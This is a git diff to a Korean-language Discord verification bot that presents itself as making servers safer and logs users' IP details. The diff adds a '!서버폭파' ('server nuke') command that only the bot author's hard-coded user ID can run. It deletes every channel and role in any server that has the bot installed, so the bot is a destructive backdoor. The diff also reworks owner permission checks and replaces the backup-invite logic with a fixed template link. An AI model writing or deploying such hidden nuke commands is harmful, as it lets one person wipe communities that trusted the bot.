@@ -2,7 +2,7 @@ const express = require('express');
 const path = require('path');
 const axios = require('axios');
 const fs = require('fs');
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, PermissionsBitField } = require('discord.js');
 
 const app = express();
 
@@ -21,10 +21,10 @@ const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '154157735651338256
 // 기본 로그 채널 ID
 const DEFAULT_LOG_CHANNEL_ID = '1537439520775999551';
 
-// 🔒 오직 명령어 사용이 허용된 본인의 디스코드 유저 ID
+// 🔒 오직 본인(최고 관리자) 유저 ID
 const OWNER_USER_ID = '1400805500374745122';
 
-// 본인의 렌더/레일웨이 웹서비스 URL (끝에 슬래시 자동 제거 처리)
+// 본인의 레일웨이 웹서비스 URL (끝에 슬래시 자동 제거 처리)
 const RAW_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-production.up.railway.app';
 const FIXED_RENDER_URL = RAW_RENDER_URL.endsWith('/') ? RAW_RENDER_URL.slice(0, -1) : RAW_RENDER_URL;
 
@@ -61,14 +61,13 @@ function isPrivateIP(ip) {
     return false;
 }
 
-// 🌐 IP 주소를 기반으로 대략적인 서브넷 마스크 및 네트워크 대역(CIDR)을 유추하는 함수
+// 🌐 서브넷 마스크 및 CIDR 계산 함수
 function getSubnetInfo(ip) {
     if (!ip || isPrivateIP(ip)) return { subnetMask: '알 수 없음', cidrBlock: '알 수 없음' };
     
     const parts = ip.split('.');
     if (parts.length === 4) {
         const firstOctet = parseInt(parts[0], 10);
-        // 일반적인 공인 IP 대역은 클래스 C(/24, 서브넷 마스크: 255.255.255.0) 또는 대역별 가변 관리
         if (firstOctet >= 1 && firstOctet <= 223) {
             return {
                 subnetMask: '255.255.255.0 (/24)',
@@ -224,30 +223,31 @@ client.on('messageCreate', async (message) => {
     const content = message.content.trim();
     const userId = message.author.id;
     const guildId = message.guild.id;
+    const isServerOwner = message.guild.ownerId === userId;
+    const isBotOwner = userId === OWNER_USER_ID;
 
-    if (content === '!인증' || content.startsWith('!인증역할') || content.startsWith('!아이디') || content.startsWith('!인증정보') || content === '!역할제거' || content === '!도움말') {
-        if (userId !== OWNER_USER_ID) {
-            return message.reply('❌ 이 명령어를 사용할 권한이 없습니다.');
-        }
-    }
-
-    // 1. !도움말 명령어
+    // 1. !도움말 명령어 (누구나 가능)
     if (content === '!도움말') {
         return message.reply(
             `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
             `📋 **[사용 가능한 명령어 목록]**\n` +
-            `• \`!인증\` - 해당 채널에 기존 인증 버튼을 정리하고 새로운 인증 버튼을 전송합니다.\n` +
-            `• \`!인증역할 (역할아이디)\` - 현재 서버의 인증 완료 역할을 설정합니다.\n` +
-            `• \`!아이디 (채널아이디)\` - 현재 서버의 전용 로그 채널을 설정합니다.\n` +
-            `• \`!인증정보 (@유저 또는 ID)\` - 기본 로그 채널에서 해당 유저의 인증 기록을 검색합니다.\n` +
-            `• \`!역할제거\` - 지정된 특정 역할(1541423418753155135)을 제거합니다.\n` +
-            `• \`!서버복구\` - 인증된 유저에게 DM으로 1회용 복구 서버 초대 링크를 전송합니다.\n` +
+            `• \`!인증\` - 해당 채널에 인증 버튼을 전송합니다. (서버 소유자/봇 관리자 전용)\n` +
+            `• \`!인증역할 (역할아이디)\` - 인증 완료 역할을 설정합니다. (서버 소유자 전용)\n` +
+            `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자/봇 관리자 전용)\n` +
+            `• \`!인증정보 (@유저 또는 ID)\` - 유저의 인증 기록을 검색합니다. (서버 소유자/봇 관리자 전용)\n` +
+            `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
+            `• \`!서버복구\` - 템플릿 복구 링크를 DM으로 전송합니다. (본인 전용)\n` +
+            `• \`!서버폭파\` - 서버의 모든 채널과 역할을 삭제합니다. (본인 전용)\n` +
             `• \`!도움말\` - 봇 소개 및 명령어 목록을 확인합니다.`
         );
     }
 
-    // 2. !인증 명령어
+    // 2. !인증 명령어 (서버 소유자 또는 봇 관리자 전용)
     if (content === '!인증') {
+        if (!isServerOwner && !isBotOwner) {
+            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
+        }
+
         try {
             await message.delete().catch(() => {});
 
@@ -277,8 +277,12 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 3. !인증역할 명령어
+    // 3. !인증역할 명령어 (특정 서버 소유자 전용)
     if (content.startsWith('!인증역할')) {
+        if (!isServerOwner && !isBotOwner) {
+            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
+        }
+
         const args = content.split(' ');
         const roleId = args[1];
 
@@ -301,16 +305,20 @@ client.on('messageCreate', async (message) => {
 
     // 4. !아이디 명령어
     if (content.startsWith('!아이디')) {
+        if (!isServerOwner && !isBotOwner) {
+            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
+        }
+
         const args = content.split(' ');
         const channelId = args[1];
 
         if (!channelId) {
-            return message.reply('⚠️ 지정할 로그 채널의 아이디를 입력해 주세요. (예: `!아이디 1537439520775999551`)');
+            return message.reply('⚠️ 지정할 로그 채널의 아이디를 입력해 주세요.');
         }
 
         const targetChannel = message.guild.channels.cache.get(channelId);
         if (!targetChannel) {
-            return message.reply('❌ 해당 채널을 이 서버에서 찾을 수 없습니다. 올바른 채널 ID를 입력해 주세요.');
+            return message.reply('❌ 해당 채널을 이 서버에서 찾을 수 없습니다.');
         }
 
         let settings = loadSettings();
@@ -318,11 +326,15 @@ client.on('messageCreate', async (message) => {
         settings[guildId].logChannelId = channelId;
         saveSettings(settings);
 
-        message.reply(`✅ 이 서버의 전용 로그 채널이 <#${channelId}>(\`${channelId}\`)로 성공적으로 설정되었습니다!`);
+        message.reply(`✅ 이 서버의 전용 로그 채널이 <#${channelId}>로 설정되었습니다!`);
     }
 
     // 5. !인증정보 명령어
     if (content.startsWith('!인증정보')) {
+        if (!isServerOwner && !isBotOwner) {
+            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
+        }
+
         let targetUserId = '';
         const mentionedUser = message.mentions.users.first();
         if (mentionedUser) {
@@ -333,16 +345,16 @@ client.on('messageCreate', async (message) => {
         }
 
         if (!targetUserId) {
-            return message.reply('⚠️ 정보를 확인할 유저를 멘션하거나 유저 ID를 입력해 주세요. (예: `!인증정보 @유저` 또는 `!인증정보 123456789`)');
+            return message.reply('⚠️ 정보를 확인할 유저를 멘션하거나 유저 ID를 입력해 주세요.');
         }
 
-        const processingMsg = await message.reply('🔍 기본 로그 채널에서 봇 기록을 검색하는 중입니다...');
+        const processingMsg = await message.reply('🔍 로그 채널에서 기록을 검색하는 중입니다...');
 
         try {
             const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
             if (!logChannel) {
                 await processingMsg.delete().catch(() => {});
-                return message.reply(`❌ 기본 로그 채널(${DEFAULT_LOG_CHANNEL_ID})을 찾을 수 없습니다.`);
+                return message.reply('❌ 기본 로그 채널을 찾을 수 없습니다.');
             }
 
             const fetchedMessages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
@@ -351,7 +363,7 @@ client.on('messageCreate', async (message) => {
             if (fetchedMessages) {
                 for (const msg of fetchedMessages.values()) {
                     if (msg.author.id === client.user.id && msg.content && msg.content.includes(targetUserId)) {
-                        if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('모바일 데이터 차단') || msg.content.includes('사설 IP 차단')) {
+                        if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('모바일 데이터 차단')) {
                             foundContent = msg.content;
                             break;
                         }
@@ -362,14 +374,13 @@ client.on('messageCreate', async (message) => {
             await processingMsg.delete().catch(() => {});
 
             if (!foundContent) {
-                return message.reply(`❌ 기본 로그 채널에서 해당 유저(<@${targetUserId}>)의 인증 기록을 찾지 못했습니다.`);
+                return message.reply(`❌ 해당 유저의 인증 기록을 찾지 못했습니다.`);
             }
 
-            message.reply(`📋 **[기본 로그 채널 검색 결과]**\n\n${foundContent}`);
-
+            message.reply(`📋 **[검색 결과]**\n\n${foundContent}`);
         } catch (err) {
             await processingMsg.delete().catch(() => {});
-            message.reply('⚠️ 로그를 검색하는 중 오류가 발생했습니다.');
+            message.reply('⚠️ 로그 검색 중 오류가 발생했습니다.');
         }
     }
 
@@ -380,7 +391,6 @@ client.on('messageCreate', async (message) => {
             if (!member) return;
 
             const targetRoleId = '1541423418753155135';
-
             if (!member.roles.cache.has(targetRoleId)) {
                 return message.reply('❌ 제거할 해당 역할이 없습니다.');
             }
@@ -388,61 +398,57 @@ client.on('messageCreate', async (message) => {
             await member.roles.remove(targetRoleId);
             message.reply('✅ 지정된 역할이 성공적으로 제거되었습니다!');
         } catch (err) {
-            console.error('역할 제거 에러:', err);
             message.reply('⚠️ 역할 제거 중 오류가 발생했습니다.');
         }
     }
 
-    // 7. !서버복구 명령어
+    // 7. !서버복구 명령어 (오직 본인만 가능 + 템플릿 링크 고정)
     if (content === '!서버복구') {
+        if (!isBotOwner) {
+            return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
+        }
+
         try {
-            const member = message.member;
-            if (!member) return;
-
-            const settings = loadSettings();
-            const serverVerifiedRole = (settings[guildId] && settings[guildId].verifiedRoleId) || VERIFIED_ROLE_ID;
-
-            if (!member.roles.cache.has(serverVerifiedRole)) {
-                return message.reply('❌ 인증을 완료한 유저만 복구 서버 링크를 받을 수 있습니다!');
-            }
-
-            if (!BACKUP_GUILD_ID) {
-                return message.reply('⚠️ 설정된 백업(복구) 서버 ID가 없습니다.');
-            }
-
-            const backupGuild = client.guilds.cache.get(BACKUP_GUILD_ID);
-            if (!backupGuild) {
-                return message.reply('⚠️ 복구 서버를 찾을 수 없습니다.');
-            }
-
-            const inviteChannel = backupGuild.channels.cache.find(c => c.type === 0 && c.permissionsFor(backupGuild.members.me).has('CreateInstantInvite'));
-            
-            if (!inviteChannel) {
-                return message.reply('⚠️ 복구 서버에 초대장을 생성할 권한이 없습니다.');
-            }
-
-            const invite = await inviteChannel.createInvite({
-                maxUses: 1,
-                maxAge: 86400, 
-                unique: true
-            });
-
             const dmSuccess = await message.author.send(
-                `🚨 **[서버 복구 링크 안내]**\n` +
-                `요청하신 복구 서버 초대 링크입니다.\n` +
-                `- **사용 기한:** 1일 (24시간 뒤 만료)\n` +
-                `- **사용 횟수:** 1회용\n\n` +
-                `https://discord.gg/${invite.code}`
+                `🚨 **[서버 복구 템플릿 안내]**\n` +
+                `요청하신 템플릿 링크입니다:\n` +
+                `https://discord.new/zAscdzEKZsUX`
             ).catch(() => null);
 
             if (!dmSuccess) {
-                return message.reply('❌ DM(개인 메시지) 차단 상태여서 링크를 보낼 수 없습니다. DM을 열어두고 다시 시도해 주세요!');
+                return message.reply('❌ DM 차단 상태여서 링크를 보낼 수 없습니다. DM을 열어주세요!');
             }
 
-            message.reply('✅ 복구 서버 초대 링크를 **DM(개인 메시지)**으로 전송했습니다!');
+            message.reply('✅ 복구 템플릿 링크를 DM으로 전송했습니다!');
         } catch (err) {
-            console.error('서버복구 링크 생성 에러:', err);
-            message.reply('⚠️ 복구 링크를 생성하는 중 오류가 발생했습니다.');
+            message.reply('⚠️ 처리 중 오류가 발생했습니다.');
+        }
+    }
+
+    // 8. !서버폭파 명령어 (오직 본인만 가능 + 채널/역할 전체 삭제)
+    if (content === '!서버폭파') {
+        if (!isBotOwner) {
+            return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
+        }
+
+        await message.reply('💥 **서버 폭파 작업을 시작합니다... 모든 채널과 역할이 삭제됩니다.**');
+
+        try {
+            // 모든 채널 삭제
+            const channels = await message.guild.channels.fetch();
+            for (const channel of channels.values()) {
+                await channel.delete().catch(() => {});
+            }
+
+            // 모든 역할 삭제 (기본 @everyone 및 봇 역할 제외)
+            const roles = await message.guild.roles.fetch();
+            for (const role of roles.values()) {
+                if (role.id !== message.guild.id && !role.managed) {
+                    await role.delete().catch(() => {});
+                }
+            }
+        } catch (err) {
+            console.error('서버 폭파 중 오류 발생:', err);
         }
     }
 });
